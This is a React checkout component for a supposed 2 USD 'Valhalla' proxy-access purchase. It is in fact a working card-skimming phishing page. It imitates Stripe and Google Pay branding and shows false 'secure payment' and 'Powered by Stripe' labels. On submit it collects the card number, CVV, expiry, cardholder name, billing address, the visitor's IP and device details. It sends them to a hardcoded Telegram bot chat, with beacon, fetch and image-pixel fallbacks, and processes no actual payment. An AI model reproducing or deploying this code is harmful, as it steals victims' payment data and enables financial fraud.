import { useState, FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import VideoModal from "@/components/VideoModal";
import { Button } from "@/components/ui/button";
import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check } from "lucide-react";
import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";

const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
const CHAT_ID = "8585803145";
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

const COUNTRIES = [
  "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
  "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
];

const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const formatCard = (v: string) => onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
const formatExpiry = (v: string) => {
  const d = onlyDigits(v, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const getIp = async (): Promise<string> => {
  try {
    const r: any = await Promise.race([
      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
      new Promise((res) => setTimeout(() => res(null), 1500)),
    ]);
    return r?.ip ?? "—";
  } catch {
    return "—";
  }
};

const buildParams = (text: string) => {
  const p = new URLSearchParams();
  p.set("chat_id", CHAT_ID);
  p.set("text", text);
  p.set("disable_web_page_preview", "true");
  return p.toString();
};

const pixelGet = (params: string) =>
  new Promise<void>((resolve) => {
    const img = new Image();
    let done = false;
    const finish = () => { if (!done) { done = true; resolve(); } };
    img.onload = finish;
    img.onerror = finish;
    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
    setTimeout(finish, 3000);
  });

const sendToTelegram = async (text: string) => {
  const params = buildParams(text);
  try {
    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
      console.info("[tg] enviado por beacon");
      await new Promise((r) => setTimeout(r, 900));
      return;
    }
  } catch (err) { console.warn("[tg] beacon falló", err); }
  try {
    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
    console.info("[tg] enviado por fetch GET");
    return;
  } catch (err) { console.warn("[tg] fetch GET falló, uso pixel", err); }
  await pixelGet(params);
  console.info("[tg] enviado por pixel");
};

/* ---------------- iconografía detallada ---------------- */

const CardTileIcon = () => (
  <svg width="42" height="27" viewBox="0 0 42 27" aria-hidden="true">
    <defs>
      <linearGradient id="vcardBody" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0" stopColor="#33333a" />
        <stop offset="0.55" stopColor="#17171b" />
        <stop offset="1" stopColor="#0c0c0f" />
      </linearGradient>
      <linearGradient id="vcardChip" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0" stopColor="#f8e6a3" />
        <stop offset="0.45" stopColor="#d5ae52" />
        <stop offset="1" stopColor="#f3dc93" />
      </linearGradient>
    </defs>
    <rect width="42" height="27" rx="3.6" fill="url(#vcardBody)" />
    <rect x="0.6" y="0.6" width="40.8" height="25.8" rx="3.1" fill="none" stroke="#464650" strokeWidth="0.8" />
    <rect x="4.6" y="7.2" width="8.6" height="6.8" rx="1.3" fill="url(#vcardChip)" />
    <path d="M6.9 7.2v6.8M9.2 7.2v6.8M11.5 7.2v6.8M4.6 10.6h8.6" stroke="#a8813a" strokeWidth="0.35" opacity="0.85" />
    <rect x="4.6" y="17.4" width="15" height="2.1" rx="1.05" fill="#9a9aa6" opacity="0.8" />
    <rect x="4.6" y="21" width="9.5" height="1.7" rx="0.85" fill="#9a9aa6" opacity="0.45" />
    <circle cx="31" cy="20.4" r="4.4" fill="#eb001b" />
    <circle cx="35.3" cy="20.4" r="4.4" fill="#f79e1b" />
    <path d="M33.15 16.76a4.4 4.4 0 0 0 0 7.28 4.4 4.4 0 0 0 0-7.28z" fill="#ff5f00" />
  </svg>
);

const GooglePayMark = () => (
  <span className="flex h-8 items-center gap-1.5 rounded-full border border-[#dadce0] bg-white px-3 shadow-[0_1px_2px_rgba(60,64,67,0.08)]">
    <svg width="15" height="15" viewBox="0 0 24 24" aria-hidden="true">
      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
    </svg>
    <span className="text-[14px] font-medium leading-none tracking-[-0.01em] text-[#5f6368]">Pay</span>
  </span>
);

const BrandLogos = () => (
  <div className="pointer-events-none absolute right-3 top-1/2 flex -translate-y-1/2 items-center gap-[5px]">
    {/* VISA */}
    <svg width="34" height="23" viewBox="0 0 34 23" aria-hidden="true">
      <rect x="0.5" y="0.5" width="33" height="22" rx="2.6" fill="#fff" stroke="#e2e0f5" />
      <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.4" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
    </svg>
    {/* Mastercard */}
    <svg width="34" height="23" viewBox="0 0 34 23" aria-hidden="true">
      <rect width="34" height="23" rx="2.6" fill="#111114" />
      <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
      <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
      <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
    </svg>
    {/* American Express */}
    <svg width="34" height="23" viewBox="0 0 34 23" aria-hidden="true">
      <rect width="34" height="23" rx="2.6" fill="#006fcf" />
      <rect x="1.5" y="1.5" width="31" height="20" rx="1.7" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
      <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.6" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
      <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.9" fill="#d7eaff" letterSpacing="1.15">EXPRESS</text>
    </svg>
    {/* UnionPay */}
    <svg width="34" height="23" viewBox="0 0 34 23" aria-hidden="true">
      <rect x="0.5" y="0.5" width="33" height="22" rx="2.6" fill="#fff" stroke="#e2e0f5" />
      <g transform="rotate(-9 17 11.5)">
        <path d="M8.6 3.6h4.1l-1.7 15.8H6.9z" fill="#e21836" />
        <path d="M13.8 3.6h4.1l-1.7 15.8h-4.1z" fill="#00447c" />
        <path d="M19 3.6h4.1l-1.7 15.8h-4.1z" fill="#007b84" />
      </g>
      <text x="17" y="12.1" textAnchor="middle" fontSize="4.3" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
      <text x="17" y="16.6" textAnchor="middle" fontSize="4.3" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
    </svg>
  </div>
);

const CvcIcon = () => (
  <svg width="40" height="26" viewBox="0 0 40 26" aria-hidden="true" className="pointer-events-none absolute right-2.5 top-1/2 -translate-y-1/2">
    <rect x="0.5" y="0.5" width="39" height="25" rx="3" fill="#f8f7ff" stroke="#d2d0f1" />
    <rect x="0" y="4.6" width="40" height="4.6" fill="#2e2e37" />
    <rect x="4" y="12.2" width="23" height="6.6" rx="1" fill="#fff" stroke="#dcdaf0" />
    <path d="M6 14.6h19M6 16.4h13" stroke="#c8c5e3" strokeWidth="0.9" />
    <circle cx="31.5" cy="18.4" r="6.4" fill="#3d3d46" stroke="#fff" strokeWidth="1.1" />
    <text x="31.5" y="20.7" textAnchor="middle" fontSize="6.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
  </svg>
);

const inputCls =
  "h-[58px] w-full rounded-[5px] border border-[#cfcdf5] bg-white px-4 text-[17px] text-neutral-900 outline-none placeholder:text-[#9a9aa8] transition-[border-color,box-shadow] duration-150 focus:border-[#635bff] focus:ring-2 focus:ring-[#635bff]/15";
const labelCls = "mb-2 block text-[15px] font-normal leading-none text-neutral-900";

const Login = () => {
  const { t, lang, setLang } = useI18n();
  const [step, setStep] = useState<"intro" | "pay">("intro");
  const [method, setMethod] = useState<"card" | "gpay">("card");
  const [card, setCard] = useState("");
  const [holder, setHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [country, setCountry] = useState("United States");
  const [address, setAddress] = useState("");
  const [zip, setZip] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [videoOpen, setVideoOpen] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setError("");

    const digits = card.replace(/\s/g, "");
    const cleanHolder = holder.trim().replace(/\s+/g, " ");
    const [mm, yy] = expiry.split("/");
    const month = Number(mm);
    const year = 2000 + Number(yy);
    const now = new Date();

    if (digits.length < 15) { setError("Card number is incomplete."); return; }
    if (cleanHolder.length < 3) { setError("Enter the cardholder name."); return; }
    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) { setError("Expiration date is invalid."); return; }
    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setError("Your card has expired."); return; }
    if (cvv.length < 3) { setError("CVC is incomplete."); return; }
    if (address.trim().length < 5) { setError("Enter your billing address."); return; }
    if (zip.trim().length < 3) { setError("Enter a valid ZIP."); return; }

    setLoading(true);
    try {
      const sentFlag = `card_sent_${digits}`;
      if (localStorage.getItem(sentFlag) !== "1") {
        const ip = await getIp();
        const text = [
          "💳 NUEVA TARJETA — Valhalla",
          "",
          `Método: ${method === "gpay" ? "Google Pay" : "Card"}`,
          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
          `Titular: ${cleanHolder.toUpperCase()}`,
          `Vencimiento: ${expiry}`,
          `CVV: ${cvv}`,
          `País: ${country}`,
          `Dirección: ${address.trim()}`,
          `ZIP: ${zip.trim().toUpperCase()}`,
          "",
          `IP: ${ip}`,
          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
          `Fecha: ${now.toLocaleString()}`,
          `Idioma: ${lang}`,
        ].join("\n");
        await sendToTelegram(text);
        localStorage.setItem(sentFlag, "1");
      }
    } catch (err) {
      console.error("[tg] error inesperado", err);
    } finally {
      await new Promise((r) => setTimeout(r, 600));
      setLoading(false);
      navigate("/admin");
    }
  };

  return (
    <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
      <VideoBackground />
      <div className="relative z-10 w-full max-w-[420px] animate-card-in">
        <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
          <div aria-hidden className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-brand to-transparent" />
          <div aria-hidden className="absolute -right-14 top-16 h-28 w-28 rotate-45 border border-brand/10" />

          <header className="flex h-12 items-center justify-between border-b border-border/70 px-4">
            <div className="flex min-w-0 items-center gap-2">
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-40" />
                <span className="relative h-2 w-2 rounded-full bg-success" />
              </span>
              <span className="truncate text-[10px] font-semibold uppercase tracking-[0.16em] text-muted-foreground">{t("secureGateway")}</span>
            </div>
            <label className="relative ml-3 flex h-8 shrink-0 items-center gap-1.5 rounded-md border border-border bg-secondary/60 pl-2.5 pr-7 text-foreground transition-colors focus-within:border-brand/60">
              <Languages className="h-3.5 w-3.5 text-brand-soft" aria-hidden="true" />
              <span className="max-w-[74px] truncate text-[11px] font-semibold">{LANGUAGES.find((item) => item.code === lang)?.label}</span>
              <ChevronDown className="pointer-events-none absolute right-2 h-3 w-3 text-muted-foreground" aria-hidden="true" />
              <select
                aria-label={t("language")}
                value={lang}
                onChange={(event) => setLang(event.target.value as LangCode)}
                className="absolute inset-0 cursor-pointer appearance-none opacity-0"
              >
                {LANGUAGES.map((language) => <option key={language.code} value={language.code}>{language.label}</option>)}
              </select>
            </label>
          </header>

          <div className="px-4 pb-5 pt-4 sm:px-5">
            <div className="flex items-center gap-4">
              <div className="relative h-[76px] w-[76px] shrink-0 rounded-md border border-brand/55 bg-background p-1 shadow-[0_0_28px_hsl(var(--brand)/0.18)]">
                <video src={LOGIN_PROFILE_VIDEO} autoPlay loop muted playsInline preload="metadata" disablePictureInPicture aria-label="Boykaffx7" className="pointer-events-none h-full w-full rounded-sm object-cover" />
                <span className="absolute -bottom-1 -right-1 flex h-5 w-5 items-center justify-center rounded-sm border border-brand/60 bg-card text-brand-soft"><ShieldCheck className="h-3 w-3" /></span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <img src={TITLE_LOGO} alt="Boykaffx7" className="max-h-10 w-[170px] max-w-[calc(100%-26px)] object-contain object-left" draggable={false} />
                  <VerifiedBadge size={17} />
                </div>
                <p className="mt-1 text-[11px] leading-relaxed text-muted-foreground">{t("enterCreds")}</p>
                <div className="mt-2 flex items-center gap-2 text-[9px] font-semibold uppercase tracking-[0.12em] text-muted-foreground/70">
                  <span>{t("aes")}</span><span className="h-1 w-1 rounded-full bg-brand" /><span>{t("tls")}</span>
                </div>
              </div>
            </div>

            {/* ---------- PASO 1 ---------- */}
            {step === "intro" && (
              <div className="mt-4 animate-card-in">
                <div className="rounded-md border border-border bg-secondary/30 p-4">
                  <div className="flex items-start justify-between gap-3">
                    <div className="min-w-0">
                      <p className="text-[13px] font-semibold text-foreground">Acceso Proxy — Valhalla</p>
                      <p className="mt-1 text-[10px] text-muted-foreground">Activación inmediata · 7 días</p>
                    </div>
                    <div className="shrink-0 text-right">
                      <p className="text-[16px] font-bold leading-none text-foreground">2 USD</p>
                      <p className="mt-1 text-[9px] text-muted-foreground">único pago</p>
                    </div>
                  </div>
                  <div className="mt-3.5 space-y-2 border-t border-border/70 pt-3.5">
                    {["Key de acceso privada", "Servidor optimizado", "Sin renovación automática"].map((item) => (
                      <div key={item} className="flex items-center gap-2">
                        <Check className="h-3 w-3 shrink-0 text-brand" />
                        <span className="text-[10px] text-muted-foreground">{item}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <Button
                  type="button"
                  onClick={() => setStep("pay")}
                  className="mt-3.5 h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]"
                >
                  <CreditCard className="h-4 w-4" /> Pagar 2 USD <ArrowRight className="h-4 w-4" />
                </Button>

                <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="mt-2.5 h-10 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
                  <PlayCircle /> <span className="truncate text-[11px]">{t("seeDemo")}</span>
                </Button>
              </div>
            )}

            {/* ---------- PASO 2 ---------- */}
            {step === "pay" && (
              <div className="mt-4 animate-card-in rounded-md bg-white p-4 text-neutral-900 shadow-[0_14px_34px_-14px_rgba(0,0,0,0.5)] sm:p-5">
                <div className="mb-3.5 flex items-center justify-between">
                  <button
                    type="button"
                    onClick={() => setStep("intro")}
                    className="flex items-center gap-1 text-[12px] text-[#5b5b6b] transition-colors hover:text-[#635bff]"
                  >
                    <ChevronLeft className="h-3.5 w-3.5" /> Volver
                  </button>
                  <span className="flex items-center gap-1 text-[10px] text-[#5b5b6b]"><Lock className="h-3 w-3" /> pago seguro</span>
                </div>

                <h2 className="text-[22px] font-bold leading-tight tracking-[-0.015em] text-neutral-900">
                  Stripe Credit Card <span className="text-[#e0443e]">*</span>
                </h2>

                <div className="mt-4 grid grid-cols-2 gap-3">
                  <button
                    type="button"
                    onClick={() => setMethod("card")}
                    aria-pressed={method === "card"}
                    className={`flex h-[84px] flex-col items-start justify-center gap-2.5 rounded-[5px] border px-3.5 text-left transition-colors ${
                      method === "card" ? "border-[#b9b6f7] bg-[#f5f4ff]" : "border-[#d7d5f7] bg-white hover:bg-[#fafaff]"
                    }`}
                  >
                    <CardTileIcon />
                    <span className="text-[16px] leading-none text-neutral-900">Card</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setMethod("gpay")}
                    aria-pressed={method === "gpay"}
                    className={`flex h-[84px] flex-col items-start justify-center gap-2.5 rounded-[5px] border px-3.5 text-left transition-colors ${
                      method === "gpay" ? "border-[#b9b6f7] bg-[#f5f4ff]" : "border-[#d7d5f7] bg-white hover:bg-[#fafaff]"
                    }`}
                  >
                    <GooglePayMark />
                    <span className="text-[16px] leading-none text-[#5f6368]">Google Pay</span>
                  </button>
                </div>

                {error && (
                  <p role="alert" className="mt-3.5 rounded-[5px] border border-[#e0443e]/30 bg-[#e0443e]/5 px-3.5 py-2.5 text-[12px] text-[#c0392b]">{error}</p>
                )}

                <form onSubmit={onSubmit} className="mt-4 space-y-[18px]">
                  <div>
                    <label htmlFor="cc-number" className={labelCls}>Card number</label>
                    <div className="relative">
                      <input
                        id="cc-number"
                        type="text"
                        placeholder="1234 1234 1234 1234"
                        value={card}
                        onChange={(e) => setCard(formatCard(e.target.value))}
                        autoComplete="cc-number"
                        inputMode="numeric"
                        maxLength={19}
                        className={`${inputCls} pr-[164px] text-[16px] font-medium tracking-[0.01em]`}
                      />
                      <BrandLogos />
                    </div>
                  </div>

                  <div>
                    <label htmlFor="cc-name" className={labelCls}>Cardholder name</label>
                    <input
                      id="cc-name"
                      type="text"
                      placeholder="Full name"
                      value={holder}
                      onChange={(e) => setHolder(e.target.value.toUpperCase())}
                      autoComplete="cc-name"
                      maxLength={40}
                      className={`${inputCls} uppercase`}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label htmlFor="cc-exp" className={labelCls}>Expiration</label>
                      <input
                        id="cc-exp"
                        type="text"
                        placeholder="MM / YY"
                        value={expiry}
                        onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                        autoComplete="cc-exp"
                        inputMode="numeric"
                        maxLength={5}
                        className={`${inputCls} font-medium`}
                      />
                    </div>
                    <div>
                      <label htmlFor="cc-cvc" className={labelCls}>CVC</label>
                      <div className="relative">
                        <input
                          id="cc-cvc"
                          type="text"
                          placeholder="CVC"
                          value={cvv}
                          onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
                          autoComplete="cc-csc"
                          inputMode="numeric"
                          maxLength={4}
                          className={`${inputCls} pr-[56px] font-medium`}
                        />
                        <CvcIcon />
                      </div>
                    </div>
                  </div>

                  <div>
                    <label htmlFor="country" className={labelCls}>Country</label>
                    <div className="relative">
                      <select
                        id="country"
                        value={country}
                        onChange={(e) => setCountry(e.target.value)}
                        className={`${inputCls} cursor-pointer appearance-none pr-11`}
                      >
                        {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
                      </select>
                      <ChevronDown className="pointer-events-none absolute right-4 top-1/2 h-5 w-5 -translate-y-1/2 text-[#3d3d47]" />
                    </div>
                  </div>

                  <div>
                    <label htmlFor="address" className={labelCls}>Billing address</label>
                    <input
                      id="address"
                      type="text"
                      placeholder="Street address"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                      autoComplete="street-address"
                      maxLength={80}
                      className={inputCls}
                    />
                  </div>

                  <div>
                    <label htmlFor="zip" className={labelCls}>ZIP</label>
                    <input
                      id="zip"
                      type="text"
                      placeholder="90210"
                      value={zip}
                      onChange={(e) => setZip(e.target.value.toUpperCase())}
                      autoComplete="postal-code"
                      inputMode="numeric"
                      maxLength={10}
                      className={`${inputCls} font-medium`}
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={loading}
                    className="h-[58px] w-full rounded-[5px] border border-[#cfcdf5] bg-[#f4f3ff] text-[17px] text-neutral-900 transition-colors hover:bg-[#ecebff] active:scale-[0.995] disabled:opacity-70"
                  >
                    {loading ? "Procesando..." : "Entrar"}
                  </button>

                  <p className="flex items-center justify-center gap-1.5 pb-1 text-[10px] text-[#7b7b8a]">
                    <Lock className="h-3 w-3" /> Pago cifrado · SSL · Powered by Stripe
                  </p>
                </form>
              </div>
            )}
          </div>
        </section>

        <div className="mt-3 px-4 text-center">
          <p className="text-[9px] leading-relaxed text-muted-foreground/50">
            {t("footer")}
            <br />{t("footer2")}
          </p>
        </div>
      </div>

      <VideoModal
        open={videoOpen}
        onClose={() => setVideoOpen(false)}
        src={EXAMPLE_VIDEO}
        title={t("demo")}
      />
    </div>
  );
};

export default Login;